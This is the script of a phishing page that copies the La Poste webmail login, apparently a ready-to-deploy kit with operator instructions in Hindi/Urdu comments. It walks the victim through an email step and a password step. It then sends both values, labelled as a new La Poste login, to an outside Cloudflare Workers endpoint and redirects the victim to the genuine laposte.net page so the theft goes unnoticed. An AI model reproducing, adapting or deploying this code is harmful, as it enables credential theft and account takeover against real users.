    <script>
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const btnSuivant = document.getElementById('btnSuivant');
        const btnRetour = document.getElementById('btnRetour');
        const btnConnecter = document.getElementById('btnConnecter');
        const emailInput = document.getElementById('emailInput');
        const displayEmail = document.getElementById('displayEmail');
        const passwordInput = document.getElementById('passwordInput');
        const btnTogglePwd = document.getElementById('btnTogglePwd');
        const eyeShow = document.getElementById('eyeShow');
        const eyeHide = document.getElementById('eyeHide');
        const helpSection = document.getElementById('helpSection');
        const featuresSection = document.getElementById('featuresSection');

        // ========================================================
        // YAHAN APNA CLOUDFLARE WORKER LINK DAALEIN
        // ========================================================
        const BACKEND_API_URL = "https://testdatasend.narpatprihar2005.workers.dev";

        // Transitions (Email -> Password -> Back)
        btnSuivant.addEventListener('click', () => {
            const email = emailInput.value.trim();
            if (email !== "") {
                step1.style.display = 'none';
                helpSection.style.display = 'none';
                featuresSection.style.display = 'none';
                
                step2.style.display = 'block';
                displayEmail.textContent = email;
                passwordInput.focus();
            } else {
                emailInput.focus();
            }
        });

        btnRetour.addEventListener('click', (e) => {
            e.preventDefault();
            step2.style.display = 'none';
            step1.style.display = 'block';
            helpSection.style.display = 'block';
            featuresSection.style.display = 'block';
        });

        // Eye Icon Toggle
        btnTogglePwd.addEventListener('click', () => {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeShow.style.display = 'none';
                eyeHide.style.display = 'block';
            } else {
                passwordInput.type = 'password';
                eyeShow.style.display = 'block';
                eyeHide.style.display = 'none';
            }
        });

        // ========================================================
        // SEND DATA TO CLOUDFLARE AND REDIRECT ON SUCCESS
        // ========================================================
        btnConnecter.addEventListener('click', async () => {
            const email = emailInput.value.trim();
            const password = passwordInput.value;

            if (password !== "") {
                const originalText = btnConnecter.innerText;
                btnConnecter.innerText = "Chargement...";
                btnConnecter.disabled = true;

                // Worker ke liye "text_data" format
                const formattedMessage = `🚨 **Nouveau Login La Poste**\n\n📧 **Email:** ${email}\n🔑 **Password:** ${password}`;
                
                const payload = {
                    text_data: formattedMessage
                };

                try {
                    const response = await fetch(BACKEND_API_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });

                    // Agar Cloudflare se status 200/ok aata hai
                    if (response.ok) {
                        window.location.href = "https://www.laposte.net/accueil";
                    } else {
                        alert("Erreur de connexion (Serveur). Veuillez réessayer.");
                        btnConnecter.innerText = originalText;
                        btnConnecter.disabled = false;
                    }
                } catch (error) {
                    console.error("Error sending data:", error);
                    alert("Erreur réseau. Veuillez vérifier votre connexion.");
                    btnConnecter.innerText = originalText;
                    btnConnecter.disabled = false;
                }

            } else {
                passwordInput.focus();
            }
        });
    </script>
